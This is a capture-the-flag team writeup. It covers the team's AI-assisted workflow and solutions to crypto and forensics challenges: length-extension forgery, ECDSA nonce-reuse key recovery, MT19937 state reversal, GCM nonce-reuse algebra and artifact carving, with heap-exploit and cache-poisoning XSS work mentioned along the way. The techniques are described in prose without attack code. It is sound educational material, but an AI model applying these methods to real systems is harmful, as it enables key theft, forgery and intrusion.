# CSCTF 2026 team writeup

Public materials and our own captures only. No live flags, credentials, tokens, cookies or
instance addresses appear in this document: challenge hosts, ports, nonces and cookies are
described, never quoted.

<!-- SECTION: TEAM — owner: team/metadata lane -->
## Team

**Team:** Dente

**Division:** Seniors — CTFd bracket 2 (`/api/v1/teams/91448` reports `bracket_id: 2`; `/api/v1/brackets` names bracket 2 "Seniors — 18 and older")

**Placement at close:** 6th of 1,580 teams · 29,127 points

**Members / handles:** K0NGR3SS, mar, Classified, kiriesh, Varenik14

<!-- SECTION: AI METHODOLOGY — owner: team/metadata lane -->
## AI methodology

We used AI heavily and we say so, because the useful part was not the generation — it was the
amount of work we could afford to *throw away*. Every flagship card below was solved by a person
driving agents who were expected to prove their claims or lose them.

**Tools/models and their role:**

- **Orchestration — Hermes agent.** One agent per challenge id, dispatched from a queue that hands
  each id out exactly once; a watcher polled the scoreboard for new cards, and a shared submission
  queue enforced 2 attempts/challenge/min, 4/min globally and a 3-wrong-per-challenge cap. Every
  attempt is attributed to the agent that spent it, in a local ledger.
- **GPT-6 Sol (Daybreak)** — artifact correlation, fingerprint/OSINT arithmetic, and drafting the
  numbered steps. Used where a card was mostly "read a lot of small facts and keep them consistent".
- **Opus 5.5 / Opus 4.8 ("Opus 5 cyber verification")** — reversing, exploit development, script
  generation, and adversarial cross-checking of another model's conclusion.
- **DeepSeek 4.1 Flash** — assembling each finished card and its solver from the raw lane notes
  (this is how the per-challenge `README.md` files and `solve.py` scripts were written).
- **Shell automation** — Python (scapy for DICOM/SNMP, raw sockets for AFC and HTTP), gdb with
  scripted breakpoints, `curl`, `sha256sum`/`openssl` as independent second implementations.
- **Custom solvers** — one committed next to each card (`solve.py`, `h.py`, `exploit_local.py`),
  replayable from the handouts; no solver depends on a value that only existed on a dead instance.

**Material, prompts, or automation that materially affected the solve:**

- **Fan-out, then fork.** One agent per card by default. When a card had more than one viable
  theory we deliberately forked it — four lanes on Phantom Device (protocol, heap primitives,
  one-shot FSOP, two-hop delivery) and four on Broadsheet Organizer (escaping, `/editor`, delivery,
  exfiltration) — and let the lanes try to falsify each other. Both cards were solved by the lane
  that contradicted the others, not by the first lane.
- **Scripted enumeration instead of judgement.** Whole hypothesis classes were closed with bulk
  measurement rather than an opinion: a cacheability map of every route (`X-Cache`/`Age` per
  request), 2,107 probed paths for a `/editor` session-issuance route, 1,400+ cookie/header
  combinations against the same endpoint, a 15-payload escaping battery across every rendering
  context. These are cheap for an agent to run and expensive for a human to argue with.
- **Exploit development with a crasher per stage.** On Phantom Device each primitive got a variant
  that had to *fire* (a wild pointer that must core-dump, a valid one that must not). "It should
  work" was not accepted as a stage transition.
- **Carried-forward dead ends.** A post-mortem file listed every eliminated path per card family,
  so a new agent on a lookalike card did not re-run it.

**What the team checked before submission:**

*One claim, one artifact.* Nothing was submitted on a model's summary. Each candidate flag had to
name the command, file, header capture or packet that produced it — if the artifact could not be
replayed from the handouts or the live service, the claim was not eligible.

Rejected outputs, kept because the rejection is the evidence:

| # | Card | Output as produced | How it was caught | What replaced it |
| --- | --- | --- | --- | --- |
| 1 | Operation Silent Ward | "The answer is the first `[ANOMALY]` line" — a full flag derived from the earliest of the eight `[ANOMALY]` timestamps and submitted as final | Platform returned `incorrect`. Eight lines carry the same tag and the spec says *the* anomalous event, so the tag cannot select between them | Re-read the log's line shapes; the four simultaneous `linkDown` lines in the first second |
| 2 | Operation Silent Ward | "The answer is the `deviceBootReport` line" — a second full flag, from the timestamp one second after the ward went silent | Platform returned `incorrect` (second rejection; attempts then stopped rather than enumerated further) | Same re-read: a boot report is a lifecycle event, not the anomaly |
| 3 | Phantom Device | "The final `.data` image cannot land" — a written conclusion that the receive path caps at ~1.1 KB, that `_IO_2_1_stdin_` needs 1,744 B, and that a second poisoned allocation is impossible. That lane closed with **no flag**, and deliberately left no flag file behind rather than fill one in | Falsified by measurement: 1,024- and 960-byte hops do land when each reply is sent just-in-time; pipelining, not bandwidth, was the real failure. A second bin can be poisoned from a *different* overflow site | Two-hop tcache poison across two size classes, fake FILE at stdin, `system(fp)` on exit |
| 4 | Broadsheet Organizer | "Stored XSS: NEGATIVE" — a correct, exhaustively measured escaping result, generalised into "there is no XSS on this card" | True for the fields tested, wrong as a conclusion: the raw sink was the embed view's `?html=`, dismissed as inert because it renders inside a sandboxed iframe | Cache-key split-brain that makes the embed body the cached ticker script |

Independent verification, per card:

- **Local reproduction first.** Phantom Device's chain was run against the shipped client locally,
  producing a marker through `system()` before the live run; heap offsets were confirmed with
  `/proc/<pid>/mem` on that local copy, not inferred from the handout.
- **Two implementations for every digest.** The Silent Ward preimage was hashed with Python
  `hashlib` *and* `printf … | sha256sum | cut -c1-8`; the handout files were re-downloaded and
  confirmed byte-identical to the local copies before any value derived from them was trusted.
- **Live oracle reads, not assumptions.** On Broadsheet Organizer every cache claim was a pair of
  requests: `X-Cache: MISS` then `X-Cache: HIT`, `Age` 0→11, body byte-compared, and the TTL
  measured by watching a HIT expire at t+13.1 s. "It should be cached" was replaced by "here is the
  HIT".
- **Read the platform back.** After every submission the local ledger and the scoreboard were
  re-read; a card was "solved" only when the platform said so, and abandoned only when measured
  negatives covered the space (e.g. `/editor`: byte-identical 403 across 1,400+ combinations, 2,107
  paths probed, not cached, not state-dependent).
- **Negatives must be measured, and are falsifiable.** Every "impossible" in our notes carries the
  command that says so — and item 3 above is what happens when one is wrong: it was overturned by a
  test, not by an argument.

**One to three screenshots of the real workflow (redact private data):**

- `[screenshot: terminal trace of the Phantom Device solver in remote mode — reply packets R8–R13, the just-in-time send order, then the marker line from the command run through the fake FILE; host and port masked]`
- `[screenshot: two-request cache proof on the Broadsheet ticker — the poisoning request, then the normal ticker fetch showing X-Cache: HIT, Age: 0, Content-Type: application/javascript; instance host and the nonce masked]`
- `[screenshot: Silent Ward preimage hashed twice on one screen — Python hashlib output and printf | sha256sum | cut -c1-8 agreeing — next to the platform's accepted verdict]`

*Redaction note:* in all three images the instance hostnames/ports, any `Set-Cookie`/`Cookie` and
embed-nonce values, and the flag strings themselves are blacked out. What stays visible is the
protocol shape, the cache headers and the two matching hash prefixes — the evidence, not the secret.

<!-- SECTION: cards -->
## Challenge writeups

## Crypto

### Countersign
Crypto · Easy · Chronos Security
Points at solve: 120

**Tools used:** `hlextend` for the length-extension arithmetic; everything else is the standard library.

**Approach**

1. `GET /api/spec` states the construction outright: `tag = SHA-256(key || message)`. That is a secret-prefix MAC, and the published tag *is* the hash state after `key || message`, so hashing can be resumed from it without ever learning the key.
2. The same spec documents the parser: split on `&`, split each token on the first `=`, keep keys matching `^[A-Za-z][A-Za-z0-9_]*$`, last value wins, command field `cmd`. That last clause is the whole challenge — an appended `&cmd=DISPATCH` overrides the original `cmd=STATUS`.
3. Two things were settled on paper before sending anything. The glue padding lands inside the preceding `nonce=` token's value and is swallowed harmlessly, and no padding byte can ever be `&` (0x26) or `=` (0x3d) in this length band, so no accidental separator is produced.
4. The tool was validated locally against a secret of known length first; the forged tag reproduced exactly.
5. The key length was the only unknown, narrowed by the spec to 8–32 bytes. Walking the band in order, 0.25 s apart, took 21 requests; 28 bytes returned the code.

**Why it works**

Merkle–Damgård hashing is stateful and the tag is the state, so appending is free; the parser's "last value wins" rule then promotes the appended command over the authentic one. The key is never learned and never needs to be.

**Validation**

A local self-test against a known-length secret came first; the service saw only the 21 requests needed to pin the key length, well inside its 60/min budget, and `solve.py` reproduced the accepted token.

### Emanation
Crypto · Medium · Michalina Moszyńska
Points at solve: 270

**Tools used:** NumPy. The attack runs in under a second.

**Approach**

1. The handout is 8,000 × 56 float32 traces against 8,000 × 16 known plaintexts, with a random delay and one fresh byte mask per row.
2. Profile before attacking. Every row has exactly one sample above 15 at an index uniform in 0–16, and nowhere else. That trigger's index is the random delay; slicing from it leaves 40 usable samples.
3. After alignment the structure falls out: sample 0 has mean 25 and std 1.00, samples 3 and 5…35 have mean 4 and std 1.73, the rest are 0.0 ± 1.00. Hamming weight of a uniform byte has mean 4 and std 1.414, which is 1.732 with N(0,1) noise. Seventeen leakage points means one mask plus sixteen masked S-box outputs.
4. First-order CPA is useless: the best |r| against HW(plaintext) was about 0.03. Second-order CPA on the centred product of two leakage points, against the exact model `E_m[(HW(m)-4)(HW(Sbox(p^k)^m)-4)]`, swept all 136 point pairs × 16 bytes × 256 keys.
5. Every byte selected `(3, 5+2i)` at r = 0.21–0.26 against a runner-up of 0.06.
6. Decrypted the sealed order with AES-128-CTR and an all-zero initial counter block.

**Why it works**

Masking defeats first-order correlation because the leakage of a masked value is independent of the unmasked one. It does not defeat the product of the two leakages, which depends on their relationship.

**Validation**

The recovered plaintext was re-encrypted under the recovered key and matched the sealed order byte for byte; `solve.py` asserts that and runs from `dist/` alone.
### Operation Dawn: The Courier's Keys
Crypto · Medium · Terminal43
Points at solve: 270

**Tools used:** `scapy`; Python's own `random` as the generator under test.

**Approach**

1. The handout is one pcap. A UDP/7000 broadcast describes key generation: `seed = (power_up_epoch << 16) | serial`, MT19937, two 512-bit primes with forced top and bottom bits, `N = pq`, `e = 65537`. Nine units send `REG`, one sends `ORDER`.
2. Settle the clock first. The capture's DNS/HTTP noise has a 2026 `Date` header while frame timestamps say 2023-11-14. The frame timestamps are the capture's own clock and the seed is built from registration times, so the header is set dressing.
3. The serial is public; the only unknown is the unit's power-up second, a few seconds before its `REG` — about one second of entropy.
4. Re-ran `random.Random(seed).getrandbits(512)` with the documented bit-forcing for each candidate epoch, walking backwards until the first prime divided `N`. Hit three seconds before `REG`, under a second of compute.
5. `q = N // p`, assert `p*q == N`, then textbook RSA decryption of the order.

**Why it works**

Every part is strong except the seed. A Mersenne Twister is fully determined by it, and the seed is a public serial plus a timestamp the capture brackets to a few seconds. There is no cryptanalysis — the key space is enumerable.

**Validation**

The factorisation is asserted before anything is decrypted, so a wrong epoch cannot produce plausible plaintext. `solve.py` runs from the pcap alone.
### Rollback Pair
Crypto · Easy · Chronos Security
Points at solve: 120

**Approach**

1. Eight ECDSA dispatch records (secp256k1, SHA-256, raw `r||s`, not low-s normalised) plus the signing public key. The scenario line is the whole hint — "resumed from a faulty application nonce-state snapshot" — the per-signature nonce was replayed after the restore.
2. Verify before attacking. Confirm the published point is on the curve, then verify all eight signatures against it. All eight verified, so the export is internally consistent and no record is a planted decoy. This is cheap and it rules out mistaking a bad record for the exposure.
3. Scan for a repeated `r`: records R-6103 and R-6107 share one. Equal `r` means equal nonce, since `r = (k·G)_x`.
4. `k = (z₁-z₂)/(s₁-s₂) mod n`, then `d = (s₁k - z₁)/r mod n`. The sign of `k` is not observable, so both `(s₁-s₂)` and `(s₁+s₂)` were tried and each candidate tested against the public key rather than assumed.
5. The answer wanted exactly 64 lowercase hex characters; the solver formats with `%064x` so a leading zero can never truncate it.

**Why it works**

ECDSA's nonce must be unique per signature. Two signatures under the same nonce give two linear equations in two unknowns, so the nonce — and then the long-term scalar — fall out directly.

**Validation**

Two independent checks on the recovered scalar: it reproduces the published public key, and together with the recovered nonce it reproduces the `s` value of both records in the reused pair exactly.

### Signing Authority
Crypto · Easy · Chronos Security
Points at solve: 120

**Approach**

1. The service is self-describing: `GET /schema` gives secp256k1 ECDSA, `z = sha256(message) mod n`, and routes `/pubkey`, `/receipts`, `/authorize`. It even names the intended attack in a field called `same_nonce_recovery`.
2. `GET /receipts` returns two receipts with an identical `r`, so the same nonce was used twice.
3. Recover `k`, then `d`, resolving the unobservable sign of `k` by testing each candidate against the published public key: `d·G == Q` held for the first.
4. Sign the one message the service refuses to sign — a promotion to master-arming — with `d` and a fresh nonce, forcing low-s as the schema's `authorize_s_rule` requires.
5. Verify the forged signature locally against the service's own public key before sending it. `POST /authorize` with the exact wire format the schema specifies — minified JSON, field order `message_hex, r, s`, all values strings, 64-char lowercase hex — returned the code on the first request.

**Why it works**

The same nonce reuse as Rollback Pair, against a live signing oracle instead of a file. The interesting part is operational rather than mathematical: the service saw exactly four requests in total, and exactly one authorization attempt, because the signature was validated offline first.

**Validation**

Local verification against the published public key before submission; accepted on the first attempt.

### The Key Wheel
Crypto · Easy · Terminal43
Points at solve: 120

**Approach**

1. Checked the attachment SHA-256 against the challenge text, then decoded the CBOR map. It has a `register` list of 1,248 consecutive 32-bit outputs, `window_opens_tx: 156`, and a standing order at transaction 155. Each transaction consumes eight output words, so the recorded window starts at output 1,248 and the missing key uses outputs 1,240 through 1,247.
2. The register is MT19937. Untempered the first 624 outputs to get a full state block; the next 624 outputs gave a second block to check the implementation.
3. Reversed one MT twist from the first block, tempered the final eight words of that previous block, and recovered the eight words feeding the missing key.
4. Verified the recovery forwards: twisting the recovered previous state reproduces the first recorded block, and twisting that block reproduces the second. A wrong untemper would fail this immediately.
5. The journal says to concatenate the eight words as big-endian `uint32` values, then build a keystream from `SHA256(key || uint32be(i))`. XORing that stream with the standing order's `sealed` bytes recovered the token.

**Why it works**

MT19937 is linear over GF(2): 624 consecutive outputs determine the whole state, and the tempering is invertible. Once the state is known, outputs before the recorded window are as computable as outputs after it — the "wheel" runs backwards.

**Validation**

The two-block forward check above, plus the keystream decrypting a structured order rather than noise. Values are omitted here because they are the challenge key material.

### The Signet
Crypto · Easy · Terminal43
Points at solve: 120

**Approach**

1. Read the case note first. The DER bundle contains six secp256k1 ECDSA signatures, numbered 0 through 5, and an AES-GCM sealed order. The note says the signing nonces advanced by a constant stride: `k_i = k_0 + i·a (mod n)`.
2. That turns the usual ECDSA equation into a linear one: `s_i·k_0 + i·s_i·a - r_i·d = z_i (mod n)`, with `z_i = SHA256(exact message OCTET STRING) mod n`. The unknowns are the first nonce `k_0`, the stride `a`, and the private key `d`.
3. Parsed the DER messages and signatures, solved any three equations with modular Gaussian elimination, then checked the answer against all six equations.
4. Derived the public key from `d` and compared its SPKI bytes with the bundle — an independent check that the scalar is the signer's.
5. Followed the note literally for the seal: `d` as 32 unsigned big-endian bytes, HKDF-SHA-256 with the seal salt and info `CSCTF26/TheSignet/v1/standing-order`, then AES-256-GCM with the 12-byte nonce, 16-byte tag and empty AAD.

**Why it works**

A nonce that is an affine function of the signature index removes the per-signature randomness. Six equations in three unknowns are heavily overdetermined, so a wrong stride or a mis-parsed message cannot survive the consistency check.

**Validation**

All six signature equations hold, the derived public key matches the bundle's SPKI bytes, and the GCM tag verified. The recovered scalar is omitted here because it is the signing key.

### Watchword
Crypto · Medium · Chronos Security
Points at solve: 270

**Approach**

1. The ZIP contains three AES-128-GCM ciphertext/tag pairs under one nonce. With empty AAD and ciphertexts of 16, 15 and 13 bytes, each GHASH has one padded ciphertext block and one length block: `T_i = M ^ (C_i·H²) ^ (L_i·H)`, where `M = AES_K(J0)` and `H = AES_K(0^128)`.
2. The reused nonce makes `M` identical in all three equations. Subtracting the first equation from the other two in GF(2^128) eliminates `H²` and leaves a linear system in `H`.
3. The different ciphertext lengths matter: the length blocks differ, so the subtraction does not collapse to zero.
4. Solved for `H`, then for `M`, and recomputed all three original tags — all matched, which is what distinguishes a correct GHASH solution from an algebraic near-miss.
5. The README in the ZIP says the master order is AES-128-CTR with a zero IV and `M` as its key. Decrypting `sealed_master_order_ctr_hex` with that key produced the exact token.

**Why it works**

GCM's authentication key is global for a key/nonce pair, and nonce reuse makes the masked `J0` term constant. Two tag equations then pin `H` and `M` without any key search — the same algebra as a many-time pad, in GF(2^128).

**Validation**

All three tags recomputed correctly from the recovered `H` and `M`; the derived CTR key then decrypted a structured order. Intermediate key values are omitted here because they are the challenge key material.


## Forensics

### Afterimage
Forensics · Medium · Chronos Security
Points at solve: 270

**Approach**

1. `relay-capture.png` is a 520×340 screenshot whose `IEND` chunk ends at byte 14,263, but the file is 26,174 bytes long. The ~12 KB after `IEND` are leftover `IDAT` chunks from the original, taller image — a textbook aCropalypse (CVE-2023-21036). The editor rewrote the screenshot in place and truncated the visible image without shrinking the file, so the bottom of the pre-crop frame is still in the tail. The on-screen note "recovery panel retained in prior frame" is the hint.
2. Concatenate the `IDAT` payloads that follow `IEND`.
3. The deflate stream starts mid-block, so brute-force a bit offset until a block decodes, inflating with a zero dictionary in place of the missing earlier 32 KB (`zlib.decompressobj(wbits=-15, zdict=b"\0"*32768)`).
4. Split the result into 520-pixel rows counting from the end, undo the PNG filters, and write a fresh PNG.
5. The recovered strip shows the relay recovery key block, the flag, and the relay/custody caption. The flag is lowercase hex, so there is no `1`/`l` or `0`/`O` ambiguity.

**Why it works**

The crop was applied by re-encoding the visible region into the existing file rather than by writing a new file. PNG readers stop at the first `IEND`, so the stale trailing chunks are invisible to a viewer but still present on disk.

**Validation**

All three chunk CRCs checked, the reconstructed rows decode to a coherent screenshot, and the flag text is legible at full size.

### Briefing for One
Forensics · Medium · Chronos Security
Points at solve: 270

**Approach**

1. Inspected the shortcut statically and read the PowerShell command embedded in it. The command derived the archive password with HMAC-SHA256, keyed from a value in the shortcut and the host's `MachineGuid`.
2. Recovered the GUID from the supplied registry data.
3. Carved `route-update.7z` from the captured HTTP response and opened it with the derived password.
4. Read the flag as the value of `briefing_token` in `route-table.json`.
5. Treated the shortcut and DLL as data throughout — nothing was executed.

**Why it works**

The password is not stored anywhere; it is a deterministic function of two values that both appear in the handout (the shortcut's embedded key material and the host GUID). Recomputing it reproduces the archive key without needing the original host.

**Validation**

The archive hash and both extracted file hashes matched the values recorded inside the shortcut, which confirms the carving and the derived password independently of the plaintext.

**Note:** the original handout ZIP is unavailable; this card is reconstructed from the saved analysis and hashes recorded at solve time.

### CAPTCHA the Water Plant
Forensics · Easy · Marius Merai
Points at solve: 120

**Approach**

1. Compared the three KAPE exports and followed activity on `OPS-NB-06`.
2. Its RunMRU showed the PowerShell command that fetched the validator.
3. The script-block log showed that validator installing AnyDesk and enabling unattended access; the password in the command was the first part of the flag.
4. The same PowerShell log recorded the description of the scheduled task `Maitenance Check`, which supplied the middle part, including its leading underscore.
5. The browser evidence retained an admin dashboard URL whose token suffix was the final part.

**Why it works**

Each artifact class preserves a different stage of the same intrusion: user-initiated execution in RunMRU, the payload's actions in script-block logging, persistence in the task description, and the operator's own dashboard in browser history. Reading them in execution order reconstructs one chain rather than four unrelated findings.

**Validation**

The three fragments assemble into a single flag-shaped string in the order the intrusion happened, and each fragment appears verbatim in an independent artifact.

### Code Red Freight
Forensics · Medium · Marius Merai
Points at solve: 270

**Approach**

1. Joined the device registration in the audit log to the Outlook sign-ins by IP and device ID. The registration named `D3VC0DE-R3L4Y`, and Outlook showed the same device using `deviceCodeFlow` from one address.
2. The unified audit log had a `New-InboxRule` event from that IP and device. Its `Name` parameter was `M4N1F3ST-L3AK`, and `ForwardTo` confirmed it was a forwarding rule.
3. Counted four distinct objects in the `FileDownloaded` events from the same IP.
4. Combined the registered device name, rule name and download count in that order.

**Why it works**

Device-code phishing leaves a consistent triple — a registered device, a token exchange from the attacker's address, and post-authentication actions from the same pair. Pivoting on the device ID rather than the user ties the mailbox rule and the downloads to one actor.

**Validation**

Every pivot stayed on the same device ID and address, the rule's `ForwardTo` field confirms exfiltration intent, and the four downloaded objects are distinct file identities rather than repeated events.

### Dawn Array
Forensics · Medium · Chronos Security
Points at solve: 270

**Approach**

1. Read the Linux md v1.2 superblocks at byte 4096. Acquisitions 1, 3 and 2 were roles 0, 2 and 3; role 1 was missing. The array was left-symmetric RAID-5, 32 KiB chunks, 1 MiB member data offset, logical size 122,683,392 bytes.
2. Rebuilt the missing member from parity and reassembled the array.
3. Extracted the procedure document, SQLite ledger, WAL, syslog and packet capture from ext4.
4. With the WAL applied, the ledger held 128 cycles instead of 95. Reassembled the controller's TCP streams and applied decision point DP-7: ledger, four syslog phases, HTTP reservation and same-connection readback all had to agree.
5. Sixteen cycles qualified, three of which appeared only in the WAL.
6. Serialised the six witness fields per qualifying cycle in gateway sequence order, prefixed `RRCA-DAWN-WITNESS-v1`, kept one LF per line, and hashed the full witness.

**Why it works**

RAID-5 parity makes a single missing member exactly recoverable, and the WAL holds commits the main database never checkpointed. The witness hash is only stable if the rebuild, the replay and the cross-source correlation are all correct.

**Validation**

Superblock geometry is self-consistent, the parity rebuild produces a mountable ext4, and the final digest is over a fully specified byte stream rather than a guessed serialisation.

### Flotsam
Forensics · Easy · Chronos Security
Points at solve: 120

**Approach**

1. Scanned the recorder image for PNG signatures and chunk markers. The PNG starts at offset `0x6800`, the beginning of sector 52; its first IDAT bytes inflate from there, and the `IEND` chunk sits in sector 47.
2. The data between them had to be reassembled from out-of-order 512-byte sectors.
3. Joined sectors `52–67`, `3–20`, `35–41` and `44–47` in that order, counting from zero and keeping 159 bytes from sector 47.
4. Checked the CRCs of IHDR, IDAT and IEND, then inflated the IDAT stream.
5. Read the key from the reconstructed chart image.

**Why it works**

The recorder wrote sectors in the order they arrived, not in file order, so a file can span non-contiguous sector runs. The chunk CRCs make the correct ordering testable: a wrong splice fails CRC before it produces a misleading image.

**Validation**

All three chunk CRCs pass and the rebuilt image renders the chart with legible text.

### Ghost in the Historian
Forensics · Medium · Mohamed Amine Mzoughi
Points at solve: 270

**Approach**

1. Verified the archive manifest and read the ext4 filesystem directly from the flat VMDK extent.
2. Found the deleted encryptor's ELF in unallocated data and disassembled it. It seeded a 32-bit generator with `((time ^ pid) * 0x9e3779b1) & 0xffffffff`; each xorshift32 step used shifts 13, 17 and 5 and yielded four little-endian keystream bytes, with state carried across files.
3. Took the PID from the historian log and the exact start second from the encrypted files' modification times.
4. Tried the three files in each order and checked the decrypted config, cache and JSON. The consistent order was grid topology, historian cache, then node status.
5. The config contained the safety interlock token, which was the answer.

**Why it works**

The generator has only two inputs and both are recoverable from the image: the log supplies the PID, and the modification times bracket the start second to one value. State continuity across files means the decryption order is not arbitrary — only one order yields three parseable documents.

**Validation**

The decrypted files parse as the expected formats, and only one permutation produced a consistent set. The ELF's constants were read from the binary rather than assumed.

### Interlock Witness
Forensics · Medium · Chronos Security
Points at solve: 270

**Approach**

1. Paired the Modbus/TCP requests and responses by transaction ID, unit, function and direction.
2. Updated the register state on normal FC03 reads and acknowledged FC16 writes; an exception response did not change state.
3. Examined the state immediately before each acknowledged single-register write to `0x0013` or `0x0014`. Of 120 target writes, 16 occurred while at least one prerequisite register (`0x000a`, `0x000b`, `0x000c`) was not 1.
4. In response order, appended each selected request and response PDU without its MBAP header.
5. Hashed `INTERLOCK-WITNESS/1`, a zero byte, and those 208 bytes.

**Why it works**

Modbus has no session state of its own, so the interlock condition exists only in the sequence of register values. Replaying the capture as a state machine turns "was the interlock satisfied" into a deterministic predicate; hashing the exact PDUs makes the answer byte-exact.

**Validation**

The transaction pairing is complete (no orphan requests), the prerequisite registers are read before each write in the capture, and 16 × 13 bytes gives the 208-byte input exactly.

### Last Buffer
Forensics · Easy · Chronos Security
Points at solve: 120

**Approach**

1. Used `case-context.json` to identify the incident file and terminal `pts/4`.
2. The shell journal recorded a disconnect at 02:19:46 UTC; the audit timeline recorded Vim PID 8442 receiving `SIGHUP` then, and the collector taking the disconnect snapshot a second later.
3. The `.swp` header held that PID and the expected original path. The older `.swo` belonged to PID 8124 on `pts/7`; its authorization decoded to `retired-training-readback-16`, which identified it as a decoy.
4. Read the swap's 4096-byte pages and recovered strings from the data block using the line offsets described in the handout.
5. The recovered revision was `INC-4471/R18`, marked `UNSAVED-AT-DISCONNECT`. Its `base_file_sha256` matched both the saved Markdown file and the checksum in the shell journal.
6. Base64url-decoding the recovered `authorization_b64` gave the flag.

**Why it works**

Vim's swap file preserves the buffer as it existed at the crash, not the saved file. The header's PID and path bind the swap to one process, and the base hash proves the recovered block belongs to the same document lineage.

**Validation**

PID, terminal, timestamp and base hash all agree across the swap header, shell journal and audit timeline; the decoy `.swo` fails the PID/path match.

### Last Commit
Forensics · Medium · Chronos Security
Points at solve: 270

**Approach**

1. The handout is a land-registry export job: `registry.sqlite` plus its WAL, `delivery.csv`, `export-profile.md` with the exact export query, and `provenance.json`.
2. The WAL has 9 frames of 4096 bytes, all with correct salts and checksums. Replayed it commit-by-commit, building a standalone snapshot at each commit (base file plus every WAL frame up to that commit, page count trimmed to the commit size).
3. Checking `export_job` in each snapshot: frame 4 has the job `QUEUED`; frame 5 has it `COMPLETED` and `integrity_check` passes — that is the moment the export ran; frames 6–8 still show `COMPLETED` but the parcel owners have been rolled back to clean values.
4. Using the frame-5 snapshot, loaded `delivery.csv` as the `manifest` table and ran the profile's query (join parcel/title/holder, filter on the job, order by position then `registry_ref` BINARY).
5. Serialised with TAB separators and LF endings exactly as the profile specifies and took the SHA-256. The profile's sample vector hashes the same way, confirming the format.
6. At export time four parcels had different holders and instrument refs; hashing the current database gives a different fingerprint.

**Why it works**

The WAL is an append-only record of every page version, so a later rollback cannot erase what an earlier commit contained. The export fingerprint is a function of the database *at export time*, which exists only in the WAL.

**Validation**

The profile's own sample vector reproduces its documented hash, and the chosen snapshot passes `integrity_check`.

### Night Clerk
Forensics · Easy · Mohamed Amine Mzoughi
Points at solve: 120

**Approach**

1. Carved the deleted Word document from the NTFS image and read the deleted audit log.
2. The log pointed to a tracked insertion in the DOCX and said to hex-decode it before applying a single-byte XOR.
3. Opened `word/document.xml` directly and read the hexadecimal text from the `w:ins` element.
4. The log described deriving the XOR key from a timestamp difference. Tested all 256 one-byte keys against the full flag format; only decimal 57 (`0x39`) produced a match.

**Why it works**

Tracked changes retain deleted and inserted text in the document XML even when the visible document shows the accepted version. A one-byte XOR is trivially brute-forced, and the flag prefix gives a reliable oracle.

**Validation**

Exactly one key produces the expected flag-format structure and printable text; the key value also matches the timestamp difference described in the audit log.

### Operation Dawn: Relay Snapshot
Forensics · Easy · Terminal43
Points at solve: 120

**Approach**

1. Inspected the captured memory in `relay.core` and found a `CSCTF` fragment at the head of a linked list. Each node stored an eight-byte next pointer, a four-byte length and the fragment bytes; the nodes appeared out of order in the file.
2. Used the ELF `PT_LOAD` segments to convert each virtual pointer to a file offset.
3. Followed 11 nodes from the head, read exactly the recorded number of bytes from each, and stopped at the null pointer.
4. The concatenation produced the complete flag.

**Why it works**

A core dump preserves heap layout as it was at crash time, including pointers that are only meaningful in the crashed process's address space. Mapping virtual addresses through the program headers turns those pointers back into file offsets, so the list can be walked without executing anything.

**Validation**

The chain terminates at a null pointer after 11 nodes, every length field stays inside the mapped segment, and the joined fragments form one contiguous flag string.

### Operation Dawn: The Burnt Server
Forensics · Easy · Terminal43
Points at solve: 120

**Approach**

1. The salvage note identified disks 0 and 2 as the survivors of a three-disk array.
2. XORed the survivors to reconstruct disk 1 and interleaved 64 KiB chunks using rotating right parity.
3. The resulting logical image contained a FAT16 volume.
4. The root directory had a deleted `?RAIN.GZ` entry marked `0xE5`, with first cluster 16 and size 16,599 bytes.
5. Used the FAT16 geometry to find the data at logical offset `0xde00`. The gzip stream decompressed to a 76,901-byte register with a valid checksum.
6. The `MOVEMENT ORDER:` line held the complete flag.

**Why it works**

RAID-5 with one missing member is exactly recoverable by XOR, and FAT marks a deleted file only in the directory entry — the cluster chain and data remain until overwritten. The gzip CRC distinguishes the correct reconstruction.

**Validation**

The reconstructed member produces a mountable FAT16 volume, the gzip stream decompresses with a valid checksum, and the register is structurally coherent.
### Operation Dawn: The Medic's Phone
Forensics · Medium · Terminal43
Points at solve: 270

**Approach**

1. `medic-phone.ab` is an Android ADB backup: a 24-byte header (`ANDROID BACKUP`, version 5, compression 1, no encryption) followed by a zlib stream that inflates to a tar.
2. The tar holds three apps — `org.unit43.courier`, `org.unit43.fieldnotes` and `org.unit43.radioset`.
3. The courier app keeps chat in `apps/org.unit43.courier/db/messages.db`. Each row's `pb` column is a protobuf whose field 5 is a raw-deflate message body.
4. Decompressing them showed message 14 from `signals` replaced with "This message was withdrawn by the sender and is no longer available" — the notice the briefing warns about.
5. SQLite keeps a write-ahead log, and `messages.db-wal` still contains the pre-withdrawal version of that page. The original message 14 was intact there, including the movement order and the flag.
6. It lines up with the fieldnotes hint that platform numbers change nightly and must be confirmed with signals.

**Why it works**

A logical "delete" in SQLite updates the main database page but does not erase the older page image already written to the WAL. Inflating the backup and grepping the journal therefore recovers text the UI no longer shows.

**Validation**

The recovered message sits at the same row and timestamp as the withdrawal notice, and its platform matches the independent fieldnotes hint.

### Operation Dawn: The Relay Tap
Forensics · Easy · Terminal43
Points at solve: 120

**Approach**

1. Found the ARLY exchange on TCP port 7443. Its descriptor defined a magic value, a message type and a big-endian body length.
2. Took the client and server nonces from types 1 and 2, hashed their concatenation with SHA-256, and generated the keystream by hashing that key followed by successive big-endian 32-bit counters.
3. The two type-3 orders reused the same TCP sequence number. Frame 115 had a valid TCP checksum and the receiver acknowledged its end sequence in frame 116.
4. Frame 117 came after that acknowledgement and had a bad TCP checksum — a retransmission injected after the fact.
5. XORed frame 115's order body with the keystream and recovered the flag.

**Why it works**

The keystream is derived from nonces exchanged in the clear, so possession of the capture is enough to decrypt any order. The TCP layer then decides which of two same-sequence frames is authentic: the one the receiver acknowledged, not the later copy.

**Validation**

Frame 115's checksum is valid and its end sequence is acknowledged by the peer; frame 117 fails checksum and arrives after that acknowledgement.

### Phantom Drift
Forensics · Hard · CSA Romania
Points at solve: 560

**Approach**

1. The artifact set describes one sortie: an approved-waypoint manifest, 57 telemetry readings, a radio intercept, two decompiled parsers and a 36-byte flight log.
2. The decisive record is a `waypoint_update` row carrying two spellings of the same six fields: snake_case (the approved waypoint) and PascalCase (the diverted one).
3. The drone's C# client sets `PropertyNameCaseInsensitive = false` with `MissingMemberHandling = Error`, so the PascalCase duplicates are logged as unknown properties and ignored. The backend's Go `encoding/json` matches keys case-insensitively, so the later PascalCase values overwrite the fields.
4. The Go `ValidateCommand` exists but is never called from `main`, so the server records the mission as nominal — its own note repeats the diverted latitude while calling it within tolerance.
5. The flag is the SHA-256 of the approved coordinates, the per-axis deltas and the WGS-84 great-circle displacement at `R = 6378137`, truncated to 16 hex.
